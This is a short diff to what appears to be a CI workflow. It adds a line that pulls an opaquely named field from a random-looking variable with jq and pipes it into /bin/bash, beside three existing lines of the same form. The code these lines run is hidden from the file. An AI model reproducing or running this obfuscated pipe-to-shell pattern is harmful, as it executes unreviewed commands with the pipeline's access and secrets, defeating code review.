@@ -39,6 +39,7 @@ jobs:
           echo $zp34 | jq -r .tvd98 | /bin/bash
           echo $fh542 | jq -r .sni19 | /bin/bash
           echo $ngot81 | jq -r .gv8145 | /bin/bash
+          printf '%s' "$yfdux74" | jq -r .l13 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
